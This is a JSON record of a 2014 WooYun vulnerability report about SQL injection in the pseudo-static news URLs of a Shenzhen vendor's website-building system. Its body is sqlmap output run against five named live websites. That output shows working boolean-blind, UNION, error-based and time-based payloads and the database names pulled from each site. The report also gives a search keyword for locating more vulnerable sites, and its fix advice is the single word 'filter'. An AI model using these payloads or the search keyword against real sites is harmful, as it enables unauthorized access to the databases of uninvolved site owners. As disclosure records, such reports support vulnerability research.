{"id": 52494, "wybug_id": "wooyun-2014-071058", "wybug_title": "某企业建站系统一处伪静态注入", "wybug_corp": "企业建站系统", "wybug_author": "Mosuan", "wybug_date": "2014-08-05 15:21", "wybug_open_date": "2014-11-03 15:22", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "11", "wybug_status": "未联系到厂商或者厂商积极忽略", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["伪静态注入"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-08-05：\t积极联系厂商并且等待厂商认领中，细节不对外公开\t\t\t\t\t\t\t\t\t2014-11-03：\t厂商已经主动忽略漏洞，细节向公众公开  简要描述： rt 详细说明：  \n1.建站程序：伪静态+mysql2、漏洞类型：伪静态注入3、缺陷文件：html注入：News/view/id/190*.html4、注入参数：id5.涉及版本：全版本7、危害程度：高危8、涉及厂商：深圳市睿鑫网络有限公司 9、厂商网站：http://www.rxwzjs.com/10、安装量：未知11、是否拥有源代码分析：暂无12、关键字：inurl://News/view/id/12.html  后面的12可以换成别的。搜索到的部分网站不存在注入，因为不是同一家建站公司，凡是存在深圳等关键词的都存在注入13、是否默认配置：是14、枚举案例【应乌云的要求，枚举5例】：【声明：以下提供的全部案例一方面证明通用型，一方面是给CNVD或Cncert测试，其他人不得用此作非法用途或者破坏操作，否则后果自负】\n\n注入地址:http://www.anypas.com/News/view/id/190*.html    sqlmap/1.0-dev - automatic SQL injection and database takeover tool    http://www.sqlmap.org[!] legal disclaimer: usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicablelocal, state and federal laws. Authors assume no liability and are not responsible for any misuse or damage caused by this program[*] starting at 04:48:22[04:48:22] [INFO] using 'C:\\Users\\Administrator\\Desktop\\rar\\output\\www.anypas.com\\session' as session file[04:48:22] [INFO] testing connection to the target url[04:48:27] [INFO] testing if the url is stable, wait a few seconds[04:48:34] [INFO] url is stable[04:48:34] [INFO] testing if URI parameter '#1*' is dynamic[04:48:39] [INFO] confirming that URI parameter '#1*' is dynamic[04:48:44] [INFO] URI parameter '#1*' is dynamic[04:48:44] [INFO] heuristics detected web page charset 'ascii'[04:48:44] [WARNING] heuristic test shows that URI parameter '#1*' might not beinjectable[04:48:44] [INFO] testing sql injection on URI parameter '#1*'[04:48:44] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'[04:49:11] [INFO] URI parameter '#1*' is 'AND boolean-based blind - WHERE or HAVING clause' injectable[04:49:11] [INFO] testing 'MySQL >= 5.0 AND error-based - WHERE or HAVING clause'[04:49:16] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'[04:49:21] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause'[04:49:27] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (XMLType)'[04:49:32] [INFO] testing 'MySQL > 5.0.11 stacked queries'[04:49:37] [INFO] testing 'PostgreSQL > 8.1 stacked queries'[04:49:42] [INFO] testing 'Microsoft SQL Server/Sybase stacked queries'[04:49:48] [INFO] testing 'MySQL > 5.0.11 AND time-based blind'[04:50:21] [INFO] URI parameter '#1*' is 'MySQL > 5.0.11 AND time-based blind' injectable[04:50:21] [INFO] testing 'MySQL UNION query (NULL) - 1 to 10 columns'[04:50:32] [INFO] ORDER BY technique seems to be usable. This should reduce thetime needed to find the right number of query columns. Automatically extending the range for UNION query injection technique[04:51:04] [INFO] target url appears to have 27 columns in query[04:53:43] [INFO] URI parameter '#1*' is 'MySQL UNION query (NULL) - 1 to 10 columns' injectableURI parameter '#1*' is vulnerable. Do you want to keep testing the others (if any)? [y/N] ysqlmap identified the following injection points with a total of 52 HTTP(s) requests:---Place: URIParameter: #1*    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: http://www.anypas.com:80/News/view/id/190 AND 1032=1032.html    Type: UNION query    Title: MySQL UNION query (NULL) - 27 columns    Payload: http://www.anypas.com:80/News/view/id/-5436 UNION SELECT NULL, NULL, NULL, NULL, NULL, CONCAT(0x3a736f733a,0x4977566d74496e6c5675,0x3a646e713a), NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL#.html    Type: AND/OR time-based blind    Title: MySQL > 5.0.11 AND time-based blind    Payload: http://www.anypas.com:80/News/view/id/190 AND SLEEP(5).html---[04:53:46] [INFO] the back-end DBMS is MySQLweb server operating system: Windows 2003web application technology: ASP.NET, Microsoft IIS 6.0back-end DBMS: MySQL 5.0.11[04:53:46] [INFO] fetching database names[04:53:46] [WARNING] the SQL query provided does not return any output[04:53:46] [INFO] retrieved:[04:53:46] [WARNING] it is very important not to stress the network adapter's bandwidth during usage of time-based queries[04:53:46] [INFO] fetching number of databases[04:53:46] [WARNING] running in a single-thread mode. Please consider usage of option '--threads' for faster data retrieval[04:53:46] [INFO] retrieved:[04:53:47] [ERROR] unable to retrieve the number of databases[04:53:47] [INFO] falling back to current database[04:53:47] [INFO] fetching current databaseavailable databases [1]:[*] bb[04:53:52] [WARNING] HTTP error codes detected during testing:400 (Bad Request) - 12 times[04:53:52] [INFO] Fetched data logged to text files under 'C:\\Users\\Administrator\\Desktop\\rar\\output\\www.anypas.com'[*] shutting down at 04:53:52\n\n注入地址:http://www.mybill.com.cn/News/view/id/190*.html    sqlmap/1.0-dev - automatic SQL injection and database takeover tool    http://www.sqlmap.org[!] legal disclaimer: usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicablelocal, state and federal laws. Authors assume no liability and are not responsible for any misuse or damage caused by this program[*] starting at 04:35:20[04:35:20] [INFO] using 'C:\\Users\\Administrator\\Desktop\\rar\\output\\www.mybill.com.cn\\session' as session file[04:35:20] [INFO] testing connection to the target url[04:35:21] [INFO] testing if the url is stable, wait a few seconds[04:35:23] [WARNING] url is not stable, sqlmap will base the page comparison ona sequence matcher. If no dynamic nor injectable parameters are detected, or incase of junk results, refer to user's manual paragraph 'Page comparison' and provide a string or regular expression to match onhow do you want to proceed? [(C)ontinue/(s)tring/(r)egex/(q)uit] c[04:35:25] [INFO] testing if URI parameter '#1*' is dynamic[04:35:25] [INFO] confirming that URI parameter '#1*' is dynamic[04:35:26] [INFO] URI parameter '#1*' is dynamic[04:35:27] [WARNING] heuristic test shows that URI parameter '#1*' might not beinjectable[04:35:27] [INFO] testing sql injection on URI parameter '#1*'[04:35:27] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'[04:35:32] [INFO] URI parameter '#1*' is 'AND boolean-based blind - WHERE or HAVING clause' injectable[04:35:32] [INFO] testing 'MySQL >= 5.0 AND error-based - WHERE or HAVING clause'[04:35:33] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'[04:35:35] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause'[04:35:36] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (XMLType)'[04:35:37] [INFO] testing 'MySQL > 5.0.11 stacked queries'[04:35:39] [INFO] testing 'PostgreSQL > 8.1 stacked queries'[04:35:40] [INFO] testing 'Microsoft SQL Server/Sybase stacked queries'[04:35:41] [INFO] testing 'MySQL > 5.0.11 AND time-based blind'[04:36:03] [INFO] URI parameter '#1*' is 'MySQL > 5.0.11 AND time-based blind' injectable[04:36:03] [INFO] testing 'MySQL UNION query (NULL) - 1 to 10 columns'[04:36:17] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'[04:36:19] [INFO] ORDER BY technique seems to be usable. This should reduce thetime needed to find the right number of query columns. Automatically extending the range for UNION query injection technique[04:36:27] [INFO] target url appears to have 16 columns in query[04:36:51] [INFO] URI parameter '#1*' is 'Generic UNION query (NULL) - 1 to 10 columns' injectableURI parameter '#1*' is vulnerable. Do you want to keep testing the others (if any)? [y/N] ysqlmap identified the following injection points with a total of 48 HTTP(s) requests:---Place: URIParameter: #1*    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: http://www.mybill.com.cn:80/News/view/id/190) AND 5580=5580 AND (5245=5245.html    Type: UNION query    Title: Generic UNION query (NULL) - 16 columns    Payload: http://www.mybill.com.cn:80/News/view/id/-8444) UNION SELECT NULL,NULL, NULL, NULL, CONCAT(0x3a6d726b3a,0x796676656c5654786944,0x3a64657a3a), NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL--  AND (1429=1429.html    Type: AND/OR time-based blind    Title: MySQL > 5.0.11 AND time-based blind    Payload: http://www.mybill.com.cn:80/News/view/id/190) AND SLEEP(5) AND (8087=8087.html---[04:36:53] [INFO] the back-end DBMS is MySQLweb server operating system: Windowsweb application technology: Apache 2.2.16back-end DBMS: MySQL 5.0.11[04:36:53] [INFO] fetching database names[04:36:54] [INFO] the SQL query used returns 4 entries[04:36:55] [INFO] retrieved: \"information_schema\"[04:36:56] [INFO] retrieved: \"mysql\"[04:36:57] [INFO] retrieved: \"nbill\"[04:36:58] [INFO] retrieved: \"test\"available databases [4]:[*] information_schema[*] mysql[*] nbill[*] test[04:36:58] [INFO] Fetched data logged to text files under 'C:\\Users\\Administrator\\Desktop\\rar\\output\\www.mybill.com.cn'[*] shutting down at 04:36:58\n\n注入地址:http://www.szxdyc.com/News/view/id/190*.html    sqlmap/1.0-dev - automatic SQL injection and database takeover tool    http://www.sqlmap.org[!] legal disclaimer: usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicablelocal, state and federal laws. Authors assume no liability and are not responsible for any misuse or damage caused by this program[*] starting at 04:33:31[04:33:31] [INFO] using 'C:\\Users\\Administrator\\Desktop\\rar\\output\\www.szxdyc.com\\session' as session file[04:33:31] [INFO] testing connection to the target url[04:33:31] [INFO] testing if the url is stable, wait a few seconds[04:33:33] [INFO] url is stable[04:33:33] [INFO] testing if URI parameter '#1*' is dynamic[04:33:33] [INFO] confirming that URI parameter '#1*' is dynamic[04:33:33] [INFO] URI parameter '#1*' is dynamic[04:33:33] [WARNING] heuristic test shows that URI parameter '#1*' might not beinjectable[04:33:33] [INFO] testing sql injection on URI parameter '#1*'[04:33:33] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'[04:33:35] [INFO] URI parameter '#1*' is 'AND boolean-based blind - WHERE or HAVING clause' injectable[04:33:35] [INFO] testing 'MySQL >= 5.0 AND error-based - WHERE or HAVING clause'[04:33:35] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'[04:33:36] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause'[04:33:36] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (XMLType)'[04:33:36] [INFO] testing 'MySQL > 5.0.11 stacked queries'[04:33:36] [INFO] testing 'PostgreSQL > 8.1 stacked queries'[04:33:36] [INFO] testing 'Microsoft SQL Server/Sybase stacked queries'[04:33:37] [INFO] testing 'MySQL > 5.0.11 AND time-based blind'[04:33:58] [INFO] URI parameter '#1*' is 'MySQL > 5.0.11 AND time-based blind' injectable[04:33:58] [INFO] testing 'MySQL UNION query (NULL) - 1 to 10 columns'[04:33:58] [INFO] ORDER BY technique seems to be usable. This should reduce thetime needed to find the right number of query columns. Automatically extending the range for UNION query injection technique[04:34:00] [INFO] target url appears to have 27 columns in query[04:34:08] [INFO] URI parameter '#1*' is 'MySQL UNION query (NULL) - 1 to 10 columns' injectableURI parameter '#1*' is vulnerable. Do you want to keep testing the others (if any)? [y/N] ysqlmap identified the following injection points with a total of 52 HTTP(s) requests:---Place: URIParameter: #1*    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: http://www.szxdyc.com:80/News/view/id/190 AND 6523=6523.html    Type: UNION query    Title: MySQL UNION query (NULL) - 27 columns    Payload: http://www.szxdyc.com:80/News/view/id/-6068 UNION SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, CONCAT(0x3a6e64683a,0x6f4b4d51485857697671,0x3a6f6d753a), NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL#.html    Type: AND/OR time-based blind    Title: MySQL > 5.0.11 AND time-based blind    Payload: http://www.szxdyc.com:80/News/view/id/190 AND SLEEP(5).html---[04:34:10] [INFO] the back-end DBMS is MySQLback-end DBMS: MySQL 5.0.11[04:34:10] [INFO] fetching database names[04:34:10] [WARNING] the SQL query provided does not return any output[04:34:10] [INFO] retrieved:[04:34:10] [WARNING] it is very important not to stress the network adapter's bandwidth during usage of time-based queries[04:34:11] [INFO] fetching number of databases[04:34:11] [WARNING] running in a single-thread mode. Please consider usage of option '--threads' for faster data retrieval[04:34:11] [INFO] retrieved:[04:34:11] [ERROR] unable to retrieve the number of databases[04:34:11] [INFO] falling back to current database[04:34:11] [INFO] fetching current databaseavailable databases [1]:[*] sq_z888888883[04:34:11] [WARNING] HTTP error codes detected during testing:400 (Bad Request) - 12 times, 404 (Not Found) - 1 times[04:34:11] [INFO] Fetched data logged to text files under 'C:\\Users\\Administrator\\Desktop\\rar\\output\\www.szxdyc.com'[*] shutting down at 04:34:11\n\n注入地址:http://www.fszhongxue.com/News/view/id/*.html    sqlmap/1.0-dev - automatic SQL injection and database takeover tool    http://www.sqlmap.org[!] legal disclaimer: usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicablelocal, state and federal laws. Authors assume no liability and are not responsible for any misuse or damage caused by this program[*] starting at 04:52:13[04:52:13] [INFO] using 'C:\\Users\\Administrator\\Desktop\\rar\\output\\www.fszhongxue.com\\session' as session file[04:52:13] [INFO] testing connection to the target url[04:52:13] [INFO] testing if the url is stable, wait a few seconds[04:52:15] [WARNING] url is not stable, sqlmap will base the page comparison ona sequence matcher. If no dynamic nor injectable parameters are detected, or incase of junk results, refer to user's manual paragraph 'Page comparison' and provide a string or regular expression to match onhow do you want to proceed? [(C)ontinue/(s)tring/(r)egex/(q)uit] c[04:52:17] [INFO] testing if URI parameter '#1*' is dynamic[04:52:17] [INFO] confirming that URI parameter '#1*' is dynamic[04:52:18] [INFO] URI parameter '#1*' is dynamic[04:52:18] [INFO] heuristics detected web page charset 'ascii'[04:52:18] [WARNING] heuristic test shows that URI parameter '#1*' might not beinjectable[04:52:18] [INFO] testing sql injection on URI parameter '#1*'[04:52:18] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'[04:52:29] [INFO] testing 'MySQL >= 5.0 AND error-based - WHERE or HAVING clause'[04:52:32] [INFO] URI parameter '#1*' is 'MySQL >= 5.0 AND error-based - WHERE or HAVING clause' injectable[04:52:32] [INFO] testing 'MySQL > 5.0.11 stacked queries'[04:52:32] [INFO] testing 'MySQL > 5.0.11 AND time-based blind'[04:52:33] [INFO] testing 'MySQL UNION query (NULL) - 1 to 10 columns'[04:52:37] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'[04:52:43] [INFO] target url appears to be UNION injectable with 8 columns[04:52:51] [WARNING] if UNION based SQL injection is not detected, please consider usage of option '--union-char' (e.g. --union-char=1) and/or try to force theback-end DBMS (e.g. --dbms=mysql)URI parameter '#1*' is vulnerable. Do you want to keep testing the others (if any)? [y/N] ysqlmap identified the following injection points with a total of 51 HTTP(s) requests:---Place: URIParameter: #1*    Type: error-based    Title: MySQL >= 5.0 AND error-based - WHERE or HAVING clause    Payload: http://www.fszhongxue.com:80/News/view/id/') AND (SELECT 6835 FROM(SELECT COUNT(*),CONCAT(0x3a76746d3a,(SELECT (CASE WHEN (6835=6835) THEN 1 ELSE 0 END)),0x3a7366793a,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a) AND ('AzRZ'='AzRZ.html---[04:52:59] [INFO] the back-end DBMS is MySQLweb server operating system: Windows 2003web application technology: ASP.NET, Microsoft IIS 6.0back-end DBMS: MySQL 5.0[04:52:59] [INFO] fetching database names[04:52:59] [INFO] the SQL query used returns 2 entries[04:53:00] [INFO] falling back to current database[04:53:00] [INFO] fetching current database[04:53:00] [INFO] retrieved: a1220100700available databases [1]:[*] a1220100700[04:53:00] [WARNING] HTTP error codes detected during testing:400 (Bad Request) - 3 times[04:53:00] [INFO] Fetched data logged to text files under 'C:\\Users\\Administrator\\Desktop\\rar\\output\\www.fszhongxue.com'[*] shutting down at 04:53:00\n\n注入地址:http://www.dh-bga.com.cn/News/view/id/190*.html    sqlmap/1.0-dev - automatic SQL injection and database takeover tool    http://www.sqlmap.org[!] legal disclaimer: usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicablelocal, state and federal laws. Authors assume no liability and are not responsible for any misuse or damage caused by this program[*] starting at 05:03:50[05:03:50] [INFO] using 'C:\\Users\\Administrator\\Desktop\\rar\\output\\www.dh-bga.com.cn\\session' as session file[05:03:50] [INFO] resuming back-end DBMS 'mysql 5.0.11' from session file[05:03:50] [INFO] testing connection to the target urlsqlmap identified the following injection points with a total of 0 HTTP(s) requests:---Place: URIParameter: #1*    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: http://www.dh-bga.com.cn:80/News/view/id/190 AND 6719=6719.html    Type: AND/OR time-based blind    Title: MySQL > 5.0.11 AND time-based blind    Payload: http://www.dh-bga.com.cn:80/News/view/id/190 AND SLEEP(5).html---[05:03:51] [INFO] the back-end DBMS is MySQLweb application technology: Apacheback-end DBMS: MySQL 5.0.11[05:03:51] [INFO] fetching database names[05:03:51] [INFO] fetching number of databases[05:03:51] [WARNING] running in a single-thread mode. Please consider usage of option '--threads' for faster data retrieval[05:03:51] [INFO] retrieved: 2[05:03:54] [INFO] retrieved: information_schema[05:05:08] [INFO] retrieved: hdm0950490_dbavailable databases [2]:[*] hdm0950490_db[*] information_schema[05:06:04] [INFO] Fetched data logged to text files under 'C:\\Users\\Administrator\\Desktop\\rar\\output\\www.dh-bga.com.cn'[*] shutting down at 05:06:04\n   漏洞证明：  详细说明   修复方案：  过滤   版权声明：转载请注明来源 Mosuan@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 未能联系到厂商或者厂商积极拒绝  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}